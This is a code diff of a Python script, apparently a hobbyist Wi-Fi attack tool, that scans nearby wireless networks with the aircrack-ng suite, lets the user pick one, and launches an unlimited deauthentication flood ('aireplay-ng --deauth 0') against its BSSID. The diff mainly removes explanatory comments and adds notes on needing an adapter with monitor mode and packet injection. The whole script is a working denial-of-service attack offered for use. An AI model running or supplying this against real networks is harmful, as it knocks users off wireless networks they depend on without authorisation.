@@ -4,6 +4,8 @@
 # Kaonashi - smert - happy hacking!
 
 # Recommended OS = Kali Linux / Debian
+# Need Wifi-Adapter that supports = Monitor mode, Packet injection
+# optional = Soft-AP mode
 # Air-ng suite tools - mdk3
 import subprocess
 import re
@@ -72,7 +74,6 @@ wlan_pattern = re.compile("^wlan[0-9]+")
 
 check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
 
-# No WiFi Adapter connected.
 if len(check_wifi_result) == 0:
     print("Please connect a WiFi adapter and try again.")
     exit()
@@ -120,13 +121,11 @@ try:
 
                         csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                         for row in csv_reader:
-                            # We want to exclude the row with BSSID.
                             if row["BSSID"] == "BSSID":
                                 pass
-                            # We are not interested in the client data.
                             elif row["BSSID"] == "Station MAC":
                                 break
-                            # Every field where an ESSID is specified will be added to the list.
+
                             elif check_for_essid(row["ESSID"], active_wireless_networks):
                                 active_wireless_networks.append(row)
 
@@ -136,13 +135,12 @@ try:
         for index, item in enumerate(active_wireless_networks):
 
             print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
-        # We make the script sleep for 1 second before loading the updated list.
+
         time.sleep(1)
 
 except KeyboardInterrupt:
     print("\nReady to make choice.")
 
-# Ensure that the input choice is valid.
 while True:
 
     choice = input("Please select a choice from above: ")
@@ -152,13 +150,10 @@ while True:
     except:
         print("Please try again.")
 
-# To make it easier to work with and read the code, we assign the results to variables.
 hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
-# Change to the channel we want to perform the DOS attack on. 
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 
-# Deauthenticate clients using a subprocess. 
 subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
 
